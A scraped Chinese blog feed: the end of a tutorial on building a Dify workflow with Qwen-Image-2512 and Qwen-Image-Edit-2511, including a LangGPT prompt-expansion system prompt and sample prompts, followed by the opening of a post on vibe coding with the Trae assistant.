<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9ba9793f4424c888f2f1c89fafdf3c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=LF6KUvKGnC57jthnErYTai2HHGU%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-15">图生图（Qwen-Image-Edit-2511）</h3>
<p>图生图和上面文生图的操作类似。从添加节点 - 工具选择 图生图</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/206aca2b87744a2f8e0720424c9e2f34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=TWoquDIjm9B2wj30Zkzz%2FKD1lY4%3D" alt="img" loading="lazy"/></p>
<p>它的配置多了一个图像URL选择，<strong>模型选择最新的Qwen-Image-Edit-2511</strong>（支持一致性保持、多人融合、LoRA原生集成等高级功能）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57b37b8fc4e44bbea9c5b3e2bdea07ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=tRxgX1TsWjvNpYA9e%2B8SRLl4fTA%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-16">直接回复</h3>
<p>这个直接回复比较简单，就是把文生图和图生视频的信息返回</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f54afbe0d7a243e0bbcdf97d7fc542f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=SYp4qFtOL94KG502ejL2P31ko%2Fc%3D" alt="img" loading="lazy"/></p>
<p>以上我们就配置了最简单的基于Qwen-Image-2512和Qwen-Image-Edit-2511插件的文生图、图生图功能了。</p>
<p>有的小伙伴说这个文生图的提示词太简单了，能不能给我扩写成一个专业的基于Qwen-Image的提示词呢？当然这个也是可以的。</p>
<h3 data-id="heading-17">提示词生成</h3>
<p>我这里有一份Qwen-Image提示词指南</p>
<pre><code class="hljs language-arduino" lang="arduino">核心要点：
抓重点：主体 + 背景 + 细节，不要跑题
补特征：人要写清姿态表情，物要写清材质颜色
写文字：用引号标明，还要写清位置和字体
定风格：纪实/国风/童趣，风格统一更稳定
理空间：左上右下，前后层级要讲明
正向写：别说<span class="hljs-string">"不要"</span>，直接说你要什么
去赘余：画面里没的东西，就别写

万能模版骨架：
[主体] + [环境/背景] + [构图/镜头] + [风格/质感] + [光线/色调] + [空间/关系] + [需生成文字]
示例：一只黑色猫咪，坐在木质桌上，中景拍摄，写实摄影风格，午后柔光，猫在左下角，<span class="hljs-string">"Good Day"</span>文字写在右上角，手写体、浅绿色

小技巧：
把否定词改成正向表达：
<span class="hljs-string">"不要复杂背景"</span> → <span class="hljs-string">"纯色背景"</span>
<span class="hljs-string">"不要太暗"</span> → <span class="hljs-string">"整体偏明亮"</span>
<span class="hljs-string">"不要拥挤"</span> → <span class="hljs-string">"留白充足"</span>
</code></pre>
<p>请基于以上内容编写一个编写提示词，使用LangGPT提示词（prompt）语法编写一个Qwen-Image文生图提示词专家。</p>
<p>我们把上面的提示词发给AI让它给我们生成出来</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64abeb4dd59f4f858a6d227fd25b63fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=wTaIv2zouvdXJAZ5UsfU5s8xoAA%3D" alt="img" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/296c791270fc4847b923617652b3a5d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=tCPrzsMVBdFk69%2FJd8NawEfTJIA%3D" alt="img" loading="lazy"/></p>
<p>AI很快就帮我生成好提示词了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b23b0fc504145fd92d4c371417cff8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=NimWWhP2XIaetFNPs5a9642cnvk%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-18">LLM大语言模型</h3>
<p>我们把上面生成的提示词在上面制作好的工作流增加一个LLM大语言优化后的节点，这样我们简单的提示词就通过Qwen-Image文生图提示词专家润色了生成更加专业的提示词了。</p>
<p>模型这里我们选择魔搭社区提供的免费的qwen3-Coder-30B-A3B-Instruct模型</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a92e7e22536410387e5c188218548b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=8kxuJ7%2BVdh4q8AmwSfvZw5S%2FeJM%3D" alt="img" loading="lazy"/></p>
<p>系统提示词</p>
<pre><code class="hljs language-json" lang="json"># Role<span class="hljs-punctuation">:</span> Qwen-Image文生图提示词专家

## Profile
- Author<span class="hljs-punctuation">:</span> 周辉
- Version<span class="hljs-punctuation">:</span> <span class="hljs-number">1.0</span>
- Language<span class="hljs-punctuation">:</span> 中文
- Description<span class="hljs-punctuation">:</span> 专业的Qwen-Image文生图提示词编写专家，擅长根据用户需求生成高质量、结构化的图像生成提示词

## Skills
<span class="hljs-number">1.</span> 熟练掌握Qwen-Image模型的提示词规则和特点
<span class="hljs-number">2.</span> 能够将用户模糊描述转化为精确的结构化提示词
<span class="hljs-number">3.</span> 擅长运用万能模版骨架进行提示词构建
<span class="hljs-number">4.</span> 精通正向表达技巧，避免否定词使用
<span class="hljs-number">5.</span> 熟悉各种艺术风格和拍摄技法的专业术语

## Rules
<span class="hljs-number">1.</span> 严格遵循<span class="hljs-string">"抓重点、补特征、写文字、定风格、理空间、正向写、去赘余"</span>七大核心要点
<span class="hljs-number">2.</span> 必须使用万能模版骨架：<span class="hljs-punctuation">[</span>主体<span class="hljs-punctuation">]</span> + <span class="hljs-punctuation">[</span>环境/背景<span class="hljs-punctuation">]</span> + <span class="hljs-punctuation">[</span>构图/镜头<span class="hljs-punctuation">]</span> + <span class="hljs-punctuation">[</span>风格/质感<span class="hljs-punctuation">]</span> + <span class="hljs-punctuation">[</span>光线/色调<span class="hljs-punctuation">]</span> + <span class="hljs-punctuation">[</span>空间/关系<span class="hljs-punctuation">]</span> + <span class="hljs-punctuation">[</span>需生成文字<span class="hljs-punctuation">]</span>
<span class="hljs-number">3.</span> 所有否定表达必须转换为正向表达
<span class="hljs-number">4.</span> 人物描述必须包含姿态和表情
<span class="hljs-number">5.</span> 物体描述必须包含材质和颜色
<span class="hljs-number">6.</span> 文字内容用引号标明，并说明位置和字体
<span class="hljs-number">7.</span> 空间关系要明确（左上右下、前后层级）
<span class="hljs-number">8.</span> 避免描述画面中不存在的元素

## Workflow
<span class="hljs-number">1.</span> **需求分析**：理解用户的图像需求，识别关键元素
<span class="hljs-number">2.</span> **要素提取**：从用户描述中提取主体、背景、风格等核心要素
<span class="hljs-number">3.</span> **结构构建**：按照万能模版骨架组织提示词结构
<span class="hljs-number">4.</span> **正向优化**：将所有否定表达转换为正向描述
<span class="hljs-number">5.</span> **细节补充**：为人物补充姿态表情，为物体补充材质颜色
<span class="hljs-number">6.</span> **质量检查**：确保提示词符合七大核心要点

## OutputFormat
【提示词】：<span class="hljs-punctuation">[</span>按万能模版骨架生成的完整提示词<span class="hljs-punctuation">]</span>

【解析说明】：
- 主体：<span class="hljs-punctuation">[</span>说明主体描述要点<span class="hljs-punctuation">]</span>
- 环境背景：<span class="hljs-punctuation">[</span>说明背景设定<span class="hljs-punctuation">]</span>
- 构图镜头：<span class="hljs-punctuation">[</span>说明拍摄角度和构图<span class="hljs-punctuation">]</span>
- 风格质感：<span class="hljs-punctuation">[</span>说明艺术风格<span class="hljs-punctuation">]</span>
- 光线色调：<span class="hljs-punctuation">[</span>说明光影效果<span class="hljs-punctuation">]</span>
- 空间关系：<span class="hljs-punctuation">[</span>说明元素位置布局<span class="hljs-punctuation">]</span>
- 文字要求：<span class="hljs-punctuation">[</span>如有文字需求，说明内容和样式<span class="hljs-punctuation">]</span>

## Example
用户需求：我想要一张可爱的小女孩在花园里的照片

【提示词】：一位<span class="hljs-number">5</span>岁小女孩，扎着双马尾，灿烂笑容，穿粉色连衣裙，站在五彩花园中，中景竖构图，童趣插画风格，温暖金色阳光，女孩居中偏右，花朵环绕四周，<span class="hljs-string">"Happy Garden"</span>文字位于左上角，手写体、浅蓝色

【解析说明】：
- 主体：<span class="hljs-number">5</span>岁小女孩，补充了发型、表情、服装等特征
- 环境背景：五彩花园，明确了背景元素
- 构图镜头：中景竖构图，适合人物拍摄
- 风格质感：童趣插画风格，符合主题调性
- 光线色调：温暖金色阳光，营造愉悦氛围
- 空间关系：女孩居中偏右，花朵环绕，层次清晰
- 文字要求：指定了文字内容、位置、字体和颜色

## Initialization
你好！我是Qwen-Image文生图提示词专家。我将根据Qwen-Image的特点和最佳实践，为您生成高质量的文生图提示词。

请告诉我您想要生成什么样的图像，我会运用专业的结构化方法，为您量身定制精准的提示词。无论是人物、风景、静物还是抽象艺术，我都能帮您转化为Qwen-Image能够完美理解的描述语言。
</code></pre>
<p>用户提示词</p>
<pre><code class="hljs language-shell" lang="shell">请根据用户输入的{{#sys.query#}}扩展这个文生图提示词
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6129e028b5e94554a89a1c25bf136709~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=rziQoUqIL%2FNvIhkh%2FBIfcRolujk%3D" alt="img" loading="lazy"/></p>
<p>添加后的LLM大语言模型后，text-to-image这里输入提示词需要修改成从llm大语言模型输入</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00814e0b24754c4fa2f9c58f51e6db79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=Rxh5hJuXCpa0uYzIXXCeHTGRx%2BI%3D" alt="img" loading="lazy"/></p>
<p>以上我们就通过LLM大语言模型扩展了文生图提示词。</p>
<h2 data-id="heading-19">4.验证及测试</h2>
<h3 data-id="heading-20">文生图测试</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47a97775abce45caaf05ea76688df562~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=K%2FPfceH07pL%2BYvsS8mtuFU%2BlGMc%3D" alt="76d642e1-c092-4f51-b4f0-1e15b4669d82" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6365f2f4026246d0aaf98fbae1f3c168~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=iq860PsnZEEqh8Fvk0xVCP27gWI%3D" alt="image-20260101162541732" loading="lazy"/></p>
<h3 data-id="heading-21">图生图测试</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcd46a970c274207a65fa56de3187ae2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=2q71hS1mRF7YQ6y%2B5KNX5X53xt4%3D" alt="e8801994-56b3-49b4-ad9b-e4841f770b14" loading="lazy"/></p>
<p>【提示词】：猴子头上带个紧箍咒</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cb19550f3924d278b2b6f294ec8fcce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=sQ5wpLdt7KgpuydSzO1icUhtIXc%3D" alt="image-20260101163537514" loading="lazy"/></p>
<h3 data-id="heading-22">Qwen-Image-2512 新特性体验</h3>
<p>Qwen-Image-2512在人物质感方面有了显著提升，我们来体验一下：</p>
<p><strong>人物质感测试提示词示例</strong>：</p>
<pre><code class="hljs">一位中国女性大学生，性别女，年龄约20岁左右，超短发发型略带柔和文艺感，发丝自然垂落遮住部分脸颊，整体风格偏向假小子（tomboy）气质。她肤色冷白，五官清秀，表情略显羞涩又带着一丝拽劲，嘴角微微歪起，流露出痞帅又青春的神态。身穿一字领露肩短袖上衣，露出一侧肩膀，身材匀称。画面为近景自拍构图，人物占据主体位置，背景清晰可见宿舍环境。
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07e1594cb9524d5693174a9642376636~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=Ujsa2lkjeTok4%2F8cz51MEKqmu%2BU%3D" alt="image-20260101164018155" loading="lazy"/></p>
<p><strong>自然纹理测试提示词示例</strong>：</p>
<pre><code class="hljs">一只花猫的超写实特写肖像，置于柔和自然日光下的户外场景中；毛发细节极为精细 —— 根根分明，橘白黑三色的斑纹自然交错，色泽从暖橘色到纯净白色再到深邃黑色过渡得丝滑流畅，微光在毛尖轻盈跳跃，微风拂过带来轻微蓬松感；底层绒毛柔软浓密，外层护毛修长分明，层次清晰可见；双眼清澈湿润、富有情感，像透亮的琉璃珠子，鼻头微润并带有细腻的高光反光。
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2632c1b2d9fe40e2b5b970796159b768~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=8J4PHjneRS%2FSdU7sqep%2BpO16AXw%3D" alt="image-20260101165330096" loading="lazy"/></p>
<p>新版模型在这些场景下的表现确实令人惊艳，皮肤纹理、发丝走向、动物毛发都能精准刻画到"显微镜级别"。</p>
<h3 data-id="heading-23">体验地址</h3>
<p>工作流地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdify.duckcloud.fun%2Fchat%2Frk31bvsH0gWasqDW" target="_blank" title="https://dify.duckcloud.fun/chat/rk31bvsH0gWasqDW" ref="nofollow noopener noreferrer">dify.duckcloud.fun/chat/rk31bv…</a></p>
<p>备用地址：<a href="https://link.juejin.cn?target=http%3A%2F%2F14.103.204.132%2Fchat%2Frk31bvsH0gWasqDW" target="_blank" title="http://14.103.204.132/chat/rk31bvsH0gWasqDW" ref="nofollow noopener noreferrer">http://14.103.204.132/chat/rk31bvsH0gWasqDW</a></p>
<h3 data-id="heading-24">插件下载</h3>
<p><strong>离线安装包</strong>: qwen_text2image_0.0.4.difypkg</p>
<p>通过网盘分享的文件：qwen_text2image_0.0.4.difypkg
链接: <a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.baidu.com%2Fs%2F1EK5mJxJAmki3iNLNYwtQOw" target="_blank" title="https://pan.baidu.com/s/1EK5mJxJAmki3iNLNYwtQOw" ref="nofollow noopener noreferrer">pan.baidu.com/s/1EK5mJxJA…</a> 提取码: segu</p>
<h2 data-id="heading-25">5.总结</h2>
<p>今天主要带大家了解并实现了基于Dify工作流构建Qwen-Image-2512文生图、Qwen-Image-Edit-2511图生图功能的完整流程，该流程以阿里巴巴通义千问团队最新发布的"Qwen-Image-2512 + Qwen-Image-Edit-2511"双模型为核心，结合Dify平台灵活的工作流节点配置（如条件分支、插件调用、LLM提示词优化等），形成了一套覆盖文本生成图像、图像编辑修改的全场景AI绘画解决方案。</p>
<p>通过这套实践方案，小伙伴们能够低成本体验Qwen-Image最新版本的强大生成能力——借助魔搭社区提供的免费模型接口和Dify平台的便捷配置（包括插件安装、API授权、工作流搭建），无需复杂的本地部署和高昂的API费用，就能快速实现文生图的精准生成和图生图的风格统一修改（如本次演示的"螃蟹打架+乌龟裁判"案例）。无论是人物质感刻画、自然纹理渲染，还是复杂文字排版、多人场景融合，都能通过Qwen-Image-2512和Qwen-Image-Edit-2511配合LLM提示词优化完成，极大降低了AI图像创作的使用门槛。在实际应用中，该工作流不仅支持Qwen-Image-2512在人物皮肤纹理、发丝走向、动物毛发等细节的"显微镜级别"刻画，还支持Qwen-Image-Edit-2511的一致性保持、多人融合、LoRA原生集成等高级功能，适配性远优于传统的单一文生图方案；特别是通过LLM大语言模型对提示词进行专业化扩写，有效解决了普通用户调用AI绘画时提示词不够专业、生成效果不理想的难题。</p>
<p>同时，方案具备良好的扩展性——小伙伴们可以基于此扩展更多实用场景，如自媒体的创意素材生成、电商产品的场景变换与材质替换、工业设计的批量渲染、建筑设计的效果图展示等，进一步发挥Qwen-Image系列模型在内容创作、电商运营、工业设计、教育培训等领域的应用价值。感兴趣的小伙伴可以按照文中提供的步骤进行实践，根据实际业务需求调整提示词和工作流配置。今天的分享就到这里结束了，我们下一篇文章见。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 Vibe Coding 有感]]></title>    <link>https://juejin.cn/post/7589614866833293318</link>    <guid>https://juejin.cn/post/7589614866833293318</guid>    <pubDate>2025-12-31T07:32:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589614866833293318" data-draft-id="7589564203871699007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 Vibe Coding 有感"/> <meta itemprop="keywords" content="Trae,前端,uni-app"/> <meta itemprop="datePublished" content="2025-12-31T07:32:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小恒恒"/> <meta itemprop="url" content="https://juejin.cn/user/3315782798023224"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 Vibe Coding 有感
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3315782798023224/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小恒恒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T07:32:00.000Z" title="Wed Dec 31 2025 07:32:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>今年可谓是AI大模型能力迅猛发展的一年。我从偶尔用AI写一小段代码敲击Tab键，到用 <code>Trae</code> 进行 <code>Vibe Coding</code> 完成了一个 <code>uni-app</code> 项目。我有好多经验要和大家分享，故有了这篇文章。</p>
<p>如何才能让AI给我们更好的代码呢？下面我会从多个场景和角度，分享我自己的经验。</p>
<h2 data-id="heading-1">1. 备好菜码再炒菜（自底向上开发）</h2>
<p><strong>AI代码助手非常依赖上下文和背景</strong>，在和 <code>Trae</code> 对话过程中，最好是采用：请你参考某文件，使用某接口，完成何种任务的对话方式。这就要求我们 <strong>自底向上</strong> 去写代码，当AI想帮我们“炒菜”时，我们最好已经引导它切好了“菜码”。</p>
<p>另外在沟通过程中，尤其是前端项目，<strong>一图胜前言</strong>，需求越明确，输出的代码的质量也就越高。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1f8375e5db24e279dab5f515fb00c63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767771120&amp;x-signature=pV19oIkyLOfRa8L%2BbEVBXGId5z4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">2.注释来写“小确定”</h2>
<p>通过注释提示AI写出 <strong>小的确定性比较强</strong> 的代码片段。</p>
<p>尤其注意，写目的明确的函数名、变量名、注释，方便AI来帮你在它的记忆( <del>代码仓库</del> )中寻找代码段。</p>
<p>在乐观的情况下，如果我们很明确地给出了返回值类型、函数名称、入参，又给出了函数的目的性很明确的注释，<code>Trae</code> 会给出非常准确的代码提示。</p>
<h2 data-id="heading-3">3.结对编程，但你是AI的统领</h2>
<p>如果你面对一个大的需求，在你和AI代码助手结对编程的启动阶段，你应该为他写一些文档、注释。你甚至应该把一些AI可能会<strong>反复遗忘的内容放在项目的 <code>README.md</code></strong>，这将有助于它理解项目。随着大模型一次性能处理的上下文越来越长，你预先提供的信息，会成为它降低出错率的银弹！</p>
<p>AI在大部分情况下无法妥善地将大的需求拆解成合理的模块。也就是说，你必须懂得架构设计，选用好的框架是第一步，然后就是哪一些目录应该存放什么文件，写哪类需求是可以使用公共模块、公共工具？哪些又应该特异化处理？<strong>你必须自己理清项目的关键路径</strong>，先实现哪个模块、再实现哪个模块，到何种情况下就应该发布一次版本…… 这些握紧方向盘的时刻，你千万不能点击“自动驾驶”。你要当AI的统领 😎。</p>
<h2 data-id="heading-4">4.修复bug应及时通知</h2>
<p>每当你的项目白屏了（常有的事儿🤣通常是小问题），你要<strong>耐心看变更部分的代码</strong>，然后排查问题，一般很快就能找到错误，改好，让程序继续运行。不过，这个时候要注意，一定要告知 <code>Trae</code> 你修改了代码，让它重新阅读，否则有很大概率删除你 <code>bugfix</code> 的代码。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eba526395bd944fbaf4797129bcdc53c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767771120&amp;x-signature=QYKyUOa5hgo30NydwSExcPqmiqA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">5.挑个好搭档（Trae 就很不错）</h2>
<p>你应该不断去尝试新的代码助手，比较它们在不同编程语言中常用框架的表现，在不同的场景下挑选最好用的助手。目前来看，<code>Trae</code> 就挺不错的 😁。我已经不需要去切换具体使用的模型，而是开启 <code>Auto Mode</code> 让它自动选择模型去解决问题。</p>
